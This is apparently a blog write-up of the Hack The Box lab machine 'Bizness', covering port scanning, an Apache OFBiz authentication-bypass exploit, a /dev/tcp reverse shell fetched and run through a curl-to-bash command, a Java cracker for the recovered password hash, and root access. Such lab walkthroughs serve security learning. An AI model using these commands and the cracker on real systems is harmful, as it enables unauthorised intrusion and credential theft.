---
title: HTB Bizness Writeup
author: Elus1nist
layout: post
date: 14 January 2023
imagesrc: https://labs.hackthebox.com/storage/avatars/1919b64800f6676d0c0d285a9d664cee.png
---
Welcome! This is my writeup of the new Season 4 Easy machine from HTB, Bizness. 

---
---
## Enumerating Services and Open Ports


So to start, as usual we run an nmap TCP port scan:

```
nmap -sC -sV -oN initial_scan 10.10.11.252
```
This gives us the scan results of:

```sh
Nmap scan report for 10.10.11.252
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
443/tcp open  ssl/http nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
```

Alright, so now we have the following services that we can exploit:
- Port 22: SSH - This service will probably become accessible once we have some creds
- Port 80: HTTP - We can see a domain name dumped `bizness.htb` (add to `/etc/hosts` file)
- Port 443: HTTPS - This is the main web page to be working with

---
---
## Enumerating HTTP

Once we add to our hosts file we can visit the HTTP webpage and see the following:

<img src="{{- 'writeup_images/Bizness/Bizness_Webpage.png' | relative_url}}" >

### Directory Fuzzing

Fuzzig for directories with feroxbuster:
```sh
feroxbuster --url http://bizness.htb --filter-status 404
```
From the fuzzing we discover a directory - `/accounting`

Visiting this page:
<img src="{{- 'writeup_images/Bizness/Bizness_Webpage_accounting.png' | relative_url}}" >

---
---
## Public Exploit - (CVE-2023-51467 and CVE-2023-49070)

After a quick search of the vulnerabilities for OFBiz we stumble across this github page - [OFBiz Authentication Bypass RCE](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)

After download ing the exploit I write a simple reverse shell bash script `bash_shell.sh`:
```
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.16.73/9101 0>&1
```
Then on my attacker machine I start a python http server on port 9001 and a nc listener on port 9101.

Running the exploit as follows results in a reverse shell:
```sh
python3 exploit.py --url http://bizness.htb --cmd 'curl http://10.10.16.73:9001/bash_shell.sh | /bin/bash'
```

This gives us the user flag in the `/home/ofbiz` directory

---
---
## Hash Reversing

Once we have the shell we can find and exfiltrate the `c54d0.dat: Derby Database` file.

Extracting important information from file:
```sh
grep c54d0.dat -e 'Password'

./c54d0.dat:21:Password="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled
```

We need to now see how the application Hashes its passwords and hopefully we can reverse engineer a password cracker:

Using the commens-codec library and rockyou.txt wordlist we can write the following cracker in Java:
```java
import org.apache.commons.codec.binary.Base64;
import java.io.BufferedReader;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.io.IOException;
import java.io.FileReader;
import java.io.*;

public class Main {
    public static void main(String[] args) {

        System.out.println("Starting Attack");
        System.out.flush();
        String filePath = "/usr/share/wordlist/rockyou.txt";

        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
            String line;

            while ((line = reader.readLine()) != null) {
                System.out.println("[*] Trying word: "+ line);
                byte[] bytes = line.getBytes(StandardCharsets.UTF_8);
                String hash = cryptBytes("SHA", "d", bytes);
                System.out.println(hash);
                if (hash.equals("$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I")){
                    System.out.println("[+] Password: " + line);
                    break;
                }
            }
        } catch (IOException ignored) {}
    }

    public static String cryptBytes(String hashType, String salt, byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        sb.append("$").append(hashType).append("$").append(salt).append("$");
        sb.append(getCryptedBytes(hashType, salt, bytes));
        return sb.toString();
    }

    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
        try {
            MessageDigest messagedigest = MessageDigest.getInstance("SHA");
            messagedigest.update("d".getBytes(StandardCharsets.UTF_8));
            messagedigest.update(bytes);
            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Error while comparing password", e);
        }
    }
}
```
This gives us the cracked password:
`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I : monkeybizness`

---
---
## Privelege Escalation

Once we have a password we can try logging in as `root`:

```
su
monkeybizness
```

BOOM! PWNED.ZIP ACHIEVED!

<img src="https://giffiles.alphacoders.com/206/206739.gif">